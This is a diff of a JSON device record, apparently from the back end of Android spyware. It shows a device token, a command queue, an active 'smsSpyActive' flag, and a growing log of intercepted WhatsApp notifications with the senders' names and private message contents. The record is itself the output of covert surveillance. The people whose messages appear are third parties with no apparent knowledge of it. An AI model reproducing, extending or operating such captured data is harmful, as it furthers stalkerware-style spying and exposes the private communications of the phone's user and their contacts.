@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959359109,
+    "lastSeen": 1776959377116,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959379231
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959378774
+      },
       {
         "appName": "WhatsApp",
         "sender": "Meii",
@@ -4003,22 +4019,6 @@
         "time": "23/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951753683
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "april Hk",
-        "content": "singkat sekalii😢",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951753574
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "oalah oke siap kak",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951753506
       }
     ],
     "galleryPhotos": [],
